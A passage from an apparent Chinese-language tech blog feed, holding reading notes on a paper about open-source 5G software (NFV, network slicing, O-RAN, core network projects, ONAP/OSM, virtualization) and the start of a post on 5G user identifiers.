Function)以軟體實踐，並執行在VM上(建立在通用硬體上)，NFV其中一項優點是每個VNF都提供原子級別的功能，<strong>因此多個VNFs可以結合在一起</strong> 創造出更複雜、特定的網路功能。</p><p><img src="https://i.imgur.com/H0J0R7K.png"></p><ol><li>The Network Orchestrator: 管理物件基礎架構上的VM，和其運行的服務</li><li>VNF:跑在VM上並執行網路功能</li><li>NFVI(Network Function Virtualization Infrastructure):由多種通用硬體組成</li></ol><blockquote><p>　open source network virtualization project:  <strong>Open Platform for NFV (OPNFV)</strong><br>　提供測試工具、驗證程式來加速企業和服務商網路轉換成NFV</p></blockquote><h2 id="RAN-and-Core-Network-slicing"><a href="#RAN-and-Core-Network-slicing" class="headerlink" title="RAN and Core Network slicing"></a>RAN and Core Network slicing</h2><p>Network Slicing是一種multi-tenancy虛擬化技術，其中網路功能從硬體和軟體中提取出來，並作為切片來提供給所謂的 <code>tenant</code> (租戶，房客)。物理基礎架構(基站、光纖、)會在多個租戶之間共享，一個租戶可能會收到一個或多個切片。 每個切片會分配特定的物理資源，並基於該物理資源上建立獨立的虛擬網路的<a href="https://www.ibm.com/docs/zh-tw/spss-modeler/SaaS?topic=node-what-is-instantiation"><strong>實例化(instantiate)</strong></a>，雖然租戶對自己的切片具有資源控制權，但卻無法與其他切片互動，這又被稱為<strong>slice isolation&#x2F;orthogonality</strong></p><p>每個切片涵蓋RAN與Core的部分的特定網路功能，租戶可在選定基站上透過RAN切片實例化提供 CaaS (for private cellular networking) 給行動用戶。也可分配RAN切片給特定的服務、用戶、應用上 Ex. 分配切片給資源需求高的應用(AR&#x2F;VR)<br><img src="https://i.imgur.com/EguDz3w.png"></p><p>這張圖在講切片技術怎樣使infra資源共享以及支援多切片嵌入在infra components的實例化並列出相關的開源軟體專案，他們各自對這個架構上的哪些部分做控制與設定和實體化。</p><h3 id="網路切片優點"><a href="#網路切片優點" class="headerlink" title="網路切片優點:"></a>網路切片優點:</h3><ol><li>每個切片都可以保留來處理具有不同安全要求的特定流量類別，並分配不同數量的資源，從而實現基礎設施級別的<strong>服務差異化(Service differentiation)</strong></li><li>切片由軟體控制，可實現對網路切片的即時、根據需求的實例化、重新設定與撤銷以適應時間變化的流量需求並符合<strong>SLAs(Service Level Aggrements)</strong></li><li>未充分利用資源以網路切片形式可出租給 <code>MVNO(Mobile Virtual Network Operators)</code>，來實現資源的最大利用程度，並給予infra提供者新的營利商機</li></ol><p>網路切片需要被動態編排、實例化、撤銷，並符合SLAs，並對於故障或中斷有強大的容忍性。</p><p><strong>OSSs(Operations Support Systems)</strong><br>OSS可透過對網路切片的閉路控制與管理來，作為保證履行服務的工具<br>同時，為垂直行業提供切片服務的運營商和基礎設施所有者必須通過專門用於反映垂直行業需求的服務的切片來生成多樣化的報價。<br><strong>BSSs(Business Support Systems)</strong><br>BSS 將需要控制這個多樣化的環境並為每個切片實施動態計費和定價機制</p><h2 id="Multi-access-edge-computing"><a href="#Multi-access-edge-computing" class="headerlink" title="Multi-access edge computing"></a>Multi-access edge computing</h2><p>5G高效能的訊號處理、傳輸機制、資料傳輸率仍無法滿足其吞吐量和對低延遲的要求，像是處理VR&#x2F;AR等這種即時性高的應用，而<strong>MEC</strong>能解決這問題。</p><p>MEC將架構的基本組件移到更靠近使用者的位置，通過建立在邊緣計算、內容緩存、NFV 和 SDN 的基礎上，MEC為 5G 應用的延遲和吞吐量需求提供了有效的解決方案。</p><ol><li>由於內容與資料在邊緣被處理，因此資料僅需偶而傳輸至CN，進而使傳輸延遲時間降低，也使CN負擔降低。</li><li>支持本地化服務供應，提供蜂窩網路專網，用於健康、環境監測、邊緣IOT運算…etc</li></ol><h2 id="Intelligence-in-the-network"><a href="#Intelligence-in-the-network" class="headerlink" title="Intelligence in the network"></a>Intelligence in the network</h2><p><code>ML/AI</code><br>資料驅動、自動化的5G網路變成可能，可用不同的use case去訓練並最佳化RAN<br>用例範圍從預測流量需求以擴展 CN 資源 到減少超可靠和低延遲通信 (URLLC) 中的延遲</p><p>而實現這種方案的框架即為O-RAN，透過與gNB,eNB互動的RIC來監控資料、學習與執行閉路驅動。</p><h1 id="The-radio-access-network"><a href="#The-radio-access-network" class="headerlink" title="The radio access network"></a>The radio access network</h1><blockquote><p>這章描述用於部屬4G&#x2F;5G的開源函式庫和框架，細節都可以在專案官網找到，故不贅述</p></blockquote><h3 id="OpenAirInterface"><a href="#OpenAirInterface" class="headerlink" title="OpenAirInterface"></a>OpenAirInterface</h3><p><a href="https://openairinterface.org/">https://openairinterface.org/</a></p><h3 id="srsLTE"><a href="#srsLTE" class="headerlink" title="srsLTE"></a>srsLTE</h3><p><a href="https://www.srslte.com/">https://www.srslte.com/</a></p><h3 id="Radysis-open-source-RAN-contributions"><a href="#Radysis-open-source-RAN-contributions" class="headerlink" title="Radysis open source RAN contributions"></a>Radysis open source RAN contributions</h3><p><a href="https://www.radisys.com/solutions/openran">https://www.radisys.com/solutions/openran</a></p><h1 id="Core-Network"><a href="#Core-Network" class="headerlink" title="Core Network"></a>Core Network</h1><p>此章節闡述針對4、5G的主流開源方案 i.e. EPC, 5G Core</p><h2 id="Evolved-Packet-Core-EPC"><a href="#Evolved-Packet-Core-EPC" class="headerlink" title="Evolved Packet Core (EPC)"></a>Evolved Packet Core (EPC)</h2><p>4G EPC的實現已在 2.1節討論過，通常包含</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- MME(Mobile Management Entity)</span><br><span class="line">- Home Subscription Server(HSS)</span><br><span class="line">- Service Gateway(SGW)</span><br><span class="line">- Packet Gateway(PGW)</span><br></pre></td></tr></table></figure><p><strong>MME(Mobile Management Gateway)</strong></p><ul><li>與UE建立連接的控制訊息</li><li>尋呼與移動性程序</li><li>NAS信令(signalling)</li><li>安全功能像是追蹤區域列表管理</li><li>PGW&#x2F;SGW選擇</li><li>UE身分認證</li><li>可達性程序</li><li>承載管理(bearer management)<br>i.e. EPC情況下為UE與PGW之間的通道，5GC情況下為UE與UPF之間的通道</li><li>支援EPC與E-UTRAN之間的控制平面信令協定</li><li>可靠的訊息傳輸服務</li><li>支援用於UDP控制訊息的通道協定</li><li>支援用於對UE進行認證、授權、計費的協定</li></ul><p><strong>HSS(Home Subscription Server)</strong></p><ul><li>User Database: 儲存subscriber資料(id 與 key)</li><li>User Authentication</li><li>提供User與MME之間的介面</li></ul><p>SGW與PGW組件通過 <strong><a href="https://zh.wikipedia.org/zh-tw/GPRS%E9%9A%A7%E9%81%93%E5%8D%8F%E8%AE%AE">GTP</a></strong> 為用戶與控制平面傳送資料<br>i.e. GRPS Tunneling Protocol User Plane(GTP-U)、GRPS Tunneling Protocol Control Plane(GTP-C) 並使用UDP作為傳輸層協定</p><div class="note info flat"><p>GTP 5G也有實作，去年被爆出洞<br>　<a href="https://www.ithome.com.tw/news/138340">https://www.ithome.com.tw/news/138340</a><br>　<a href="https://itw01.com/8JS4VEH.html">https://itw01.com/8JS4VEH.html</a></p></div><p>支援Packet Routing和Forwarding，分配IP位址給UE，Paging機制，支援LTE EPC的開源專案有:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- OpenAirInterface(with OAI-CN)</span><br><span class="line">- srsLTE(with srsEPC)</span><br><span class="line">- Open5GS</span><br><span class="line">- Open Mobile Evolved Core(OMEC)</span><br></pre></td></tr></table></figure><p>各開源專案對於EPC各介面實作情況<br><img src="https://i.imgur.com/671qK43.png"></p><h2 id="5G-Core"><a href="#5G-Core" class="headerlink" title="5G Core"></a>5G Core</h2><p><img src="https://i.imgur.com/pZoXlQI.png"></p><p>目前實踐5G核網的開源專案是<strong>Free5GC</strong>，是基於NextEPC(現在的Open5GS)去實作的，<br>提供</p><ul><li>使用者存取、移動性、會話(AMF與SMF)管理</li><li>由其他NF提供的服務發現(Service Discovery)功能  (NRF)</li><li>提供NFs來選擇分配UE的切片 (Network Slice Selection Function)</li><li>管理、儲存、取得使用者資料 (UDM、UDR)</li><li>UE的認證 (AUSF)</li><li>核網的運營與管理 (Operations, Administration and Maintenance (OAM))</li><li>網路編排 …etc</li></ul><p>有被free5gc實作出的3GPP介面:</p><ul><li><strong>N1&#x2F;N2</strong>: 分別連接AMF到UE與RAN，用來進行會話與移動性管理</li><li><strong>N3&#x2F;N4&#x2F;N6</strong>: 分別連接UPF到RAN,SMF,與網路(data network)</li><li><strong>N8</strong>: 連接UDM 與 AMF，進行使用者認證程序</li><li><strong>N10&#x2F;N11</strong>: 分別連接SMF到UDM與AMF，負責處理訂閱及會話管理請求</li><li><strong>N12&#x2F;N13</strong>: 分別連接AUSF到AMF與UDM，它們啟用認證服務</li></ul><h1 id="RAN-and-core-frameworks"><a href="#RAN-and-core-frameworks" class="headerlink" title="RAN and core frameworks"></a>RAN and core frameworks</h1><p>這章描述了多個運用在RAN與核網的<strong>開放框架</strong><br>雖然第三、四章所講的軟體可以執行特定功能，但以下段落所介紹的框架更通用且範圍更廣，並與RAN、CN用於管理、控制與協調</p><p><em>開放框架與架構整理</em><br><img src="https://i.imgur.com/qE16Kyt.png"></p><h2 id="O-RAN"><a href="#O-RAN" class="headerlink" title="O-RAN"></a>O-RAN</h2><p>由O-RAN聯盟所提倡的針對vRAN的開放標準定義，並有兩大目標。<br>第一個是藉由部屬在edge的智慧控制器來整合ML,AI技術<br>第二個是對於開放與敏捷的定義，由RAN的不同元件之間定義明確的介面來實現，<br><strong>由於O-RAN必須公開相同的API，因此很容易將組件替換為其他相同功能的替代組件</strong> 這種作法使5G O-RAN可以整合不同廠商的元件。</p><p><img src="https://i.imgur.com/LP2jmRl.png"></p><h3 id="O-RAN-architecture"><a href="#O-RAN-architecture" class="headerlink" title="O-RAN architecture"></a>O-RAN architecture</h3><p>最頂部的SMO運行著一個non-RT RIC，它以高於1秒的粒度(granularity)執行<strong>控制決定</strong>(control decisions)，它可以提供O-RAN不同功能，例如說可以針對RAN所提供的資料來訓練不同的演算法。</p><p>然而 near-RT RIC，運行著一個<strong>控制迴圈</strong>，並且有著比較密集的時間區間(decision &lt; 10 ms)，會依賴RAN不同的start,stop,override或control 的型別而有所不同 e.g. radio resource management</p><p><strong>這些API可被安裝在near-RT RIC上的應用程式(又稱xApps)來使用</strong><br>而這些xApps可由第三方實體所開發並從公共商店(marketplace)中取得。<br>舉例來說，藉由near-RT RIC和它的xApps，營運商可以控制用戶移動過程(user mobility processes，即 handovers)，根據預測的聯網車輛和無人機的路徑來分配網路資源，執行負載平衡和交通轉向並優化排程策略。near-RT RIC也可以使用在non-RT RIC中所訓練的演算法來做點事。</p><p>O-RAN的其他組件像是CU&#x2F;DU&#x2F;RU，像是5G gNB被拆分成CU&#x2F;DU&#x2F;RU和4G eNB。CU又被進一步拆分成，控制面CU跟用戶面CU。根據3GPP對於不同拆分的定義，O-RAN選擇 <strong>split 7-2x</strong> 作為DU&#x2F;RU的拆分；因此在編碼、調變、和mapping資源都是由DU做的；然和解調變、cyclic prefix addition和digital to analog則是在RU中實現，而precoding則是在兩者中都行。</p><h3 id="O-RAN-interfaces"><a href="#O-RAN-interfaces" class="headerlink" title="O-RAN interfaces"></a>O-RAN interfaces</h3><p>兩個RIC之間的介面為A1介面，而non-RT RIC使用 O1介面與RIC和4G eNB互動</p><ul><li><p>A1介面讓near-RT RIC可提供:</p><ul><li>policy-based guidance to near-RT RIC(以防它偵測到其掏做未實現RAN的效能目標)</li><li>管理ML Model</li><li>向near-RT RIC提供豐富資訊，例如從RAN外部來源，來更進一步精細RAN的優化</li></ul></li><li><p>O1介面，則是具備操作與管理功能，並努力與現有標準兼容來實現與現有框架的完美整合，例如說他仰賴NETCONF或其他3GPP所定義的API。</p></li><li><p>non-RT RIC使用O1介面來:</p><ul><li>供應管理(provision management)</li><li>故障監督(fault supervision)</li><li>效能保證服務 (performance assurance services)</li><li>啟動、註冊和更新實體設備</li><li>管理通訊監控設備</li></ul></li><li><p>near-RT RIC也暴露了E2介面到其他不同元件上(CU,DU,eNB)；這個介面只專注部屬</p><ol><li>near-RT RIC對於E2介面終端節點的控制操作</li><li>管理RIC和這些節點互動行為</li></ol></li><li><p>E1與F1介面符合3GPP的規範。</p></li></ul><p>E1介面跑在控制與用戶面CU之間，它的主要功能是特定UE的trace蒐集與承載建立(bearer setup)和管裡<br>F1介面則是跑在CU與DU之間，它有兩個不同的版本，一個是連接到控制面CU另一個則是用戶面CU；F1負責在CU與DU之間傳送信令(signaling)和資料，以執行<strong>RPC程序</strong> 和<strong>PDCP-RLC交換</strong>。</p><p>最後，與RU之間的介面，則是由O-RAN內部的Open Fronthaul工作組來制定，這個介面攜帶用於data plane的<strong>compressed IQ samples</strong>和用於beamforming和其他物理層程序的控制消息。</p><h3 id="O-RAN-Deployment-Options"><a href="#O-RAN-Deployment-Options" class="headerlink" title="O-RAN Deployment Options"></a>O-RAN Deployment Options</h3><p>O-RAN設想了不同的部屬策略，分別是在區域(regional)或邊緣雲(edge cloud)或者是在營運商擁有的蜂窩基站。每個設施都可以運行O-Cloud，即容器和虛擬機，使用開放介面執行O-RAN程式，<br>或是有個專用的站點使用O-RAN的開放API但可以運行閉源程式碼(closed source code)，兩種情況下圖皆有描述，其描述了6種不同的O-RAN部屬組合</p><p><img src="https://i.imgur.com/dxigwNb.png"></p><p>在 Scenario A，所有元件除了RU以外，都部屬在網路邊緣，共同位於<strong>與fronthaul光纖連接的</strong> 相同的資料中心。</p><p>其他部屬策略是 RIC與CU共同部屬在區域雲設施中，而DU與RU位於網路邊緣或是蜂窩基站上，而首選的部屬策略是 <strong>Scenario B</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RIC在區域雲上</span><br><span class="line">CUs,DUs在edge</span><br><span class="line">只有RU是在營運商的蜂窩基站上</span><br></pre></td></tr></table></figure><h3 id="The-O-RAN-Software-Community"><a href="#The-O-RAN-Software-Community" class="headerlink" title="The O-RAN Software Community"></a>The O-RAN Software Community</h3><p>除了標準化活動，O-RAN也有軟體社群(OSC)，與Linux Foundation合作，貢獻符合O-RAN規範的5G軟體</p><p>第一個版本的釋出是2019的Amber release<br>第二個版本是2020的Bronze release</p><p>這些 release包含了Docker容器和多個O-ran組件的開源軟體:</p><ul><li>non-RT RIC :具有A1介面控制器和管理AI模型的能力</li><li>near-RT RIC 平台: 具有多個應用程序，像是:<ul><li>admission control</li><li>UE manager</li><li>performance and measurement monitor<br>  可藉由E2介面與DU溝通</li></ul></li><li>DU:<ul><li>一個初始版本的fronthaul函式庫</li></ul></li><li>一個用於操作、管理、維護以及虛擬化架構的框架</li><li>simulator:<ul><li>用於測試各個介面</li></ul></li></ul><p>而 cherry release 則是嘗試透過RIC完成不同RAN Component之間的整合。</p><blockquote><p>目前最新發行版為<a href="https://wiki.o-ran-sc.org/display/REL/F+Release">F-Release</a></p></blockquote><p>而 <strong>SD-RAN</strong> 專案也正在領導、開發一項開發工作，目標是實現與O-RAN RIC介面整合的開源規、符合3GPP的RAN。</p><h2 id="Open-Networking-Foundation-frameworks"><a href="#Open-Networking-Foundation-frameworks" class="headerlink" title="Open Networking Foundation frameworks"></a>Open Networking Foundation frameworks</h2><p>由多家電信營運商組成的聯盟，這些運營商提供用於部屬其網路開源程式以及框架<br>包含: OMEC、SD-RAN、ONOS<br>Components Projects 為了特定目的框架與軟體，而Exemplar包含了許多的 Components Projects。</p><h2 id="Other-frameworks-and-projects"><a href="#Other-frameworks-and-projects" class="headerlink" title="Other frameworks and projects"></a>Other frameworks and projects</h2><p>除了O-RAN與ONF方案，許多開源社群也釋出了針對連通性、切片和核心的框架與專案</p><h3 id="5G-EmPOWER"><a href="#5G-EmPOWER" class="headerlink" title="5G-EmPOWER"></a>5G-EmPOWER</h3><p>是一套用於<strong>異構(heterogenous)</strong> RAN架構的作業系統，它由一個開源、可重新程式化的軟體平台組成，該平台將物理基礎設施抽象化，並提供高階API來操控RAN功能。</p><p>5G-EmPOWER 也將控制平面和用戶平面分開，這種分離實際上是由兩個主要組件組成: 一個中央控制器與一組代理。<br><strong>中央控制器:</strong></p><ol><li>作為OS，並且完全了解物理基礎設施功能</li><li>透過OpenEmpower協定來發送控制指令以編排代理的行為</li></ol><p><strong>代理:</strong></p><ol><li>運行在每個網路單元上</li><li>將底層RAN特定的協定(LTE、Wifi)實作 抽象化到控制器</li><li>根據控制器的指令來修改底層協定參數</li></ol><p>5G-EmPOWER目前支援多種無線電存取技術(Radio Access Technologies, RAT)<br>包含LTE、Wifi、LoRa  (5G NR尚未支援)</p><p>此外還有以下專案:</p><ul><li>FlexRAN</li><li>Magma</li><li>LL-MEC</li><li>LightEdge</li><li>OpenRAN (不等於O-RAN Projects)</li><li>Akraino REC</li><li>NVIDIA Aerial</li></ul><h2 id="Open-virtualization-and-management-frameworks"><a href="#Open-virtualization-and-management-frameworks" class="headerlink" title="Open virtualization and management frameworks"></a>Open virtualization and management frameworks</h2><p>除了RAN與CN軟體，虛擬化與管理框架也扮演重要的角色。</p><blockquote><p>ETSI定義了一個NFV MANO框架(Management and Orchestration)應有的共同特徵，主要是為了編排(Orchestrating)網路功能(NF)</p></blockquote><p><img src="https://i.imgur.com/IjG4wat.png"><br><em>上圖指出這些NFV對應在5G生態圈中的哪個部分</em></p><p><strong>NFV Orchestrators</strong> 負責提供網路服務，i.e. 實體及虛擬網路功能(PNF&#x2F;VNF)的結合能夠經由特定的拓樸來連接在一起，來管理它們的生命週期。</p><p>根據 ETSI架構:<br>一個NFV Orchestrator 由下列組成:</p><ol><li>一個管理虛擬化基礎設施(e.g. VIM(Virtualization Infra. Manager)框架，例如OpenStack,Kubernetes,Docker等)的子系統以及與物理硬體的連接</li><li>一個實際的MANO框架</li><li>它所管理的VNFs的集合<br>這些框架有著Northbound、Southbound API來與其它蜂窩網路組件互動<br>本章將會討論虛擬化技術、VIMs，討論受歡迎的 MANO框架像是ONAP、OSM、Open Baton</li></ol><h2 id="Virtualization-techniques"><a href="#Virtualization-techniques" class="headerlink" title="Virtualization techniques"></a>Virtualization techniques</h2><p>NFV將部署在網路中的服務與其運行的硬體基礎設施分離，而應用程式都被包進與硬體分隔虛擬機中，NFV消除了對每個NF對特定硬體的需求，實現網路的可擴增性</p><p><img src="https://i.imgur.com/QBfrv68.png"><br><em>此圖為NFV的高階架構圖，並展示多種實現方式</em></p><h2 id="Traditional-Virtual-Machine"><a href="#Traditional-Virtual-Machine" class="headerlink" title="Traditional Virtual Machine"></a>Traditional Virtual Machine</h2><p>硬體層級虛擬化、提供機器節級別的隔離，透過guest OS與kernel來模擬電腦系統<br>由於VNF有許多硬體虛擬化要求，因此傳統VM被認為是一種資源密集型的作法</p><h2 id="Bare-metal-hypervisors"><a href="#Bare-metal-hypervisors" class="headerlink" title="Bare-metal hypervisors"></a>Bare-metal hypervisors</h2><p>bare-metal hypervisor VM做法與傳統VM做法相近，但這種做法是Hypervisor直接run在主機的硬體上而不需要主機的作業系統，也可用於管理+運行容器或unikernel，而不是整個虛擬機</p><h2 id="Containers"><a href="#Containers" class="headerlink" title="Containers"></a>Containers</h2><p>打包特定程式以及它的dependencies，以虛擬化的方式來run應用程式和服務的虛擬環境<br>容器間彼此分隔，並共享host OS以及對kernel的存取，比起VM，不需要將底部硬體虛擬化，相比來說輕便許多，而容器可被透過與Host OS相接的<strong>容器管理員(container manager)</strong> 來維護<br>或透過Hypervisoer直接跑在裸機Host機器中</p><p>開源容器系統:</p><ul><li><strong>LXC</strong>: 現代容器的主要實踐辦法，透過cgroup與namespaces隔離以創造有獨立網路和process空間的虛擬環境</li><li><strong>Docker</strong>: 允許創造容器，使用OS級別的虛擬化來將他們部屬在機器上，與lxc不同點它將服務、應用、依賴項分解成每個容器內的模組化的單元跟分層，而這些分層可多個容器共享，增加容器映像檔的效率。</li></ul><h3 id="Unikernels"><a href="#Unikernels" class="headerlink" title="Unikernels"></a>Unikernels</h3><p>Unikels是微小、輕量，特製的image，唯一目的是為了run特定的應用程式，他們會將應用服務和其依賴編譯成可執行的虛擬映像檔，過程中不會去包含不必要的組件，因此unikernel能比起傳統容器和VM達到更好的效能；因為unikernel只會包含運行目標應用所必需的軟體元件因此暴露了比較少可能被惡意攻擊的功能，來提高系統的安全性。</p><p>目前已知Unikernel系統: <strong>ClickOS</strong>, <strong>IncludeOS</strong>, <strong>OSv</strong>,<strong>MirageOS</strong>, <strong>Unik</strong></p><p>蜂窩網路相關的Unikernel應用如下:(論文)</p><ul><li>整合Android的函式庫到OSv以降低MCC(Mobile Cloud Computer),MFC(Mobile Fog Computing)行動運算負擔</li><li>基於unikernel的5G網路CDN，如ClickOS,OSv,MirageOS</li><li>其中一篇論文對5g應用實例化為 VNF的IncludeOS unikernel和Docker做效能比較</li></ul><h2 id="Hypervisors"><a href="#Hypervisors" class="headerlink" title="Hypervisors"></a>Hypervisors</h2><p>是一套軟體用來跑虛擬機(guest machines)在實體機器上的(Host Machine)<br>Hypervisor的的關鍵任務是</p><ol><li>在主客體機器間提供虛擬化</li><li>管理客體機器資源的分配與重新分配(CPU,Memory,Storage)</li><li>主客體機器之間的資源調度</li></ol><p>有兩種類別的Hypervisor: Type1 ,Type2<br><strong>Type 1 :</strong>  Hypervioser直接跑在裸機(bare-metal)host機器上，並在host上作為OS<br>Example: Xen, Vmware ESXi<br><strong>Type 2 :</strong>  作為軟體層跑在host OS上<br>Example: Linux Kernel-based VM (KVM),BSD bhyve, Oracle Virtual Box</p><h3 id="Virtualization-infrastrucutre-managers-VIM"><a href="#Virtualization-infrastrucutre-managers-VIM" class="headerlink" title="Virtualization infrastrucutre managers(VIM)"></a>Virtualization infrastrucutre managers(VIM)</h3><p>VIM負責控制與管理NFV基礎設施架構和其資源，像是儲存、計算、網路資源、並在Host硬體上協調客體機器的實例化。<strong>VIM屬於MANO框架的一部分</strong>，框架部分前面提過了</p><p>VIMs的範例有: <strong>OpenStack</strong>、<strong>Kubernetes</strong></p><ul><li><strong>OpenStack</strong>: 一個雲端計算平台，能夠控制大量異構(heterogeneous)資源，像是計算、儲存、網路資源等。在它的眾多功能之中，它可像是VIM一樣，管理網路基礎設施、虛擬機、容器、unikernel、VNF服務和應用</li><li><strong>Kubernetes</strong>: 提供自動化部屬、擴充、管理VM、容器、unikernel、和其應用；透過一系列的物件來抽象化和表達系統的狀態，這些持久性實體描述了在K8S管理的cluster上跑的VNF和應用程式、它們的可用資源以及有關其預期行為的策略。<br>  經過數年也有數個與k8s互動來處理協定層Layer2,Layer3複雜問題的專案，像是<strong>Istio</strong>、<strong>NSM(Network Service Mesh)</strong> 等<ul><li>Istio mesh service: 實作流量管理、策略執行、和遙測收集(telemetry collection)等任務</li><li>NSM:NSM透過Kubernetes API以支援進階使用案例並促進採用新的cloud native方案，並且它也能夠允許網路管理員執行無縫執行任務，像是請求網路介面、添加無線電服務等等</li></ul></li></ul><h2 id="The-Open-Network-Automation-Platform"><a href="#The-Open-Network-Automation-Platform" class="headerlink" title="The Open Network Automation Platform"></a>The Open Network Automation Platform</h2><p>主要是由Linux Foundation開發的一套NFV框架，有許多支援的營運商。<br>OAN被部屬在多個商業蜂窩網路之中，其廠商像是Ericsson,Nokia,Huawai,ZTE這些公司，他們提供ONAP支援並整合進他們的產品。</p><p>ONAP對於商業蜂窩網路中最讚的基於軟體的解決方式。<br>ONAP負責處理大量網路服務的設計、創造和生命週期管理</p><p>網路營運商可用ONAP編排部屬在他們網路中的PNF與VNF。除了NFV orchestrator共同擁有的功能(對於虛擬基礎設施或網路服務使用自動化且基於policy的管理)，ONAP還提供一個<strong>設計框架</strong>來模擬網路應用和服務，以一個<strong>資料分析框架</strong>來監控服務的修復和擴增</p><p>ONAP還提供了許多的參考設計(i.e. blueprint)，可用來為特定場景(5G Networks,VoLTE…etc)部屬部屬ONAP架構，</p><p><img src="https://i.imgur.com/gaDoMDa.png"></p><p>ONAP架構的主要components:</p><ul><li><strong>Management Framework:</strong> 又被稱為<strong>OOM</strong> (ONAP Operations Manager)，負責編排與監控ONAP組件的生命週期，OOM利用K8S和<strong>Consul</strong>來支援服務控制、發現、設定和分段。在它的功能中最值得注意的是<ul><li>Component deployment,dependency manager and configuration</li><li>real-time health monitoring</li><li>service clusteromg and scaling</li><li>component upgrade,restart and deletion</li></ul></li><li><strong>Design Framework</strong>: <ul><li>允許使用宣告式的<strong>模型語言</strong> 來建立網路服務，使得可以指定每個服務的要求和功能。</li><li>它允許通過一組通用規範和策略來對資源、服務、產品及其管理和控制功能進行<strong>建模</strong>。</li><li>它還包括用於系統資產、流程和策略的定義、模擬和認證的服務設計和創建模組。</li><li>模組也提供現有服務的資料庫和用於驗證網路功能的API</li></ul></li><li><strong>Run-time Framework</strong><ul><li>由許多軟體框架組成，用於大多數的管理與編排功能</li><li>當在run-time階段，Micorservices Bus允許由ONAP管理的不同網路功能(NF)之間的訊息與資料通訊及路由</li><li>run-time框架使用自動化的control loop來調度終止微服務，並從平台收集資料和分析資料</li><li>run-time component有公開API、dashboard和cmdline工具，透過一個統一的介面來控制網路基礎施設施</li></ul></li></ul><p>在這些框架底層可以用來與外部控制器、作業系統、雲端環境整合；nothboud API則提供給OSS&#x2F;BSS，大數據及相關服務。</p><h2 id="Integration-with-5G-networks"><a href="#Integration-with-5G-networks" class="headerlink" title="Integration with 5G networks"></a>Integration with 5G networks</h2><p>除了一般的行動網路編排與管理框架，ONAP提供了與5G部屬相關的重要功能<br>通常營運商的主要要求會是需支援hybrid infra</p><ul><li>須包含軟硬體設備</li><li>邊緣自動化，雲須分布在地理位置上不同的邊緣位置</li><li>real-time 分析(須使用自動化的control loop)</li></ul><p>The Frankfurt release (June 2020)與O-RAN整合</p><h2 id="Open-Source-NFV-Management-and-Orchestration"><a href="#Open-Source-NFV-Management-and-Orchestration" class="headerlink" title="Open Source NFV Management and Orchestration"></a>Open Source NFV Management and Orchestration</h2><p>Open Source NFV Management and Orchestration(OSM)是由一堆網路營運商開發的一個MANO框架。<br>與ONAP相似，也被開發及部屬在蜂窩網路之中。</p><p><img src="https://i.imgur.com/rPRGyRL.png"><br><em>OSM的架構圖</em></p><ul><li><strong>The information model</strong>:<br>  將為NF,切片建模為模板，稱為packages，這是由ETSI MANO框架所提供的定義明確的資訊模型來實現的。與ONAP的design components類似，它使電信營運商能夠分析網路需求，並對需要為功能、服務、切片部屬的資源進行建模。</li><li><strong>The OSM Automation Framework</strong>:<br>  它自動化了NF的生命週期，從初始化到擴增到刪除，而這由應用資訊模型到實際部屬的infra上<br>  ，來完成的(可看上圖)，透過自動化框架向不同建模組件公開northbound interface</li></ul><p>與ONAP一樣，OSM southbound norhtbound APIs可公開給外部服務，像是其他編排器和OSS&#x2F;BSS等</p><h1 id="Software-defined-radio-support-for-open-source-radio-units"><a href="#Software-defined-radio-support-for-open-source-radio-units" class="headerlink" title="Software-defined radio support for open source radio units"></a>Software-defined radio support for open source radio units</h1><p>SDR設備<br>USRP、BladeRF、LimeSDR、Iris</p><h1 id="Testbeds"><a href="#Testbeds" class="headerlink" title="Testbeds"></a>Testbeds</h1><p>介紹開源應用、框架、硬體元件用來實例化及軟體化5G網路的測試平台</p><p><img src="https://i.imgur.com/QvOZnqY.png"></p><h1 id="Softwarized-5G-Limitations-and-road-ahead"><a href="#Softwarized-5G-Limitations-and-road-ahead" class="headerlink" title="Softwarized 5G: Limitations and road ahead"></a>Softwarized 5G: Limitations and road ahead</h1><ul><li>Keep pace with the standards</li><li>Latency and scalability issues.</li><li>Limited contributions for RAN open source software</li></ul><div class="note info flat"><p>論文連結: <a href="https://ece.northeastern.edu/wineslab/papers/bonati2020open.pdf">https://ece.northeastern.edu/wineslab/papers/bonati2020open.pdf</a></p></div>]]></content>
      
      
      <categories>
          
          <category> 論文導讀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 5G </tag>
            
            <tag> O-RAN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪筆記- 5G 核心網路-移動性管理(Mobile Management)</title>
      <link href="/posts/a05f1769.html"/>
      <url>/posts/a05f1769.html</url>
      
        <content type="html"><![CDATA[<h2 id="用戶標誌與位置標誌"><a href="#用戶標誌與位置標誌" class="headerlink" title="用戶標誌與位置標誌"></a>用戶標誌與位置標誌</h2><p>用戶標誌分為永久標誌與非永久標誌兩種:</p><ul><li><p><strong>永久標誌</strong><br>  一旦用戶綁定便不會修改，具備一定程度的隱私性</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. SUPI</span><br><span class="line">2. 通用公共訂閱標誌(GPSI)</span><br><span class="line">3. 永久設備標誌(PEI)</span><br></pre></td></tr></table></figure></li><li><p><strong>非永久標誌</strong><br>  用於臨時標示用戶，3GPP會不定期更標示符號</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 5G 全球臨時統一標示符(5G-GUTI)</span><br><span class="line">2. SUCI</span><br></pre></td></tr></table></figure><p>位置標誌包含<strong>小區位置跟蹤標誌(TAI)<strong>、</strong>跟蹤區編碼(TAC)</strong></p></li></ul><h3 id="SUPI"><a href="#SUPI" class="headerlink" title="SUPI"></a>SUPI</h3><p>SUPI為永久標誌，5G系統中每個簽約的用戶都會被分配到一個5G SUPI，用於<strong>在3GPP系統中</strong>標示該簽約用戶<br>SUPI標誌存於<strong>UDM&#x2F;UDR(一種NF)</strong> 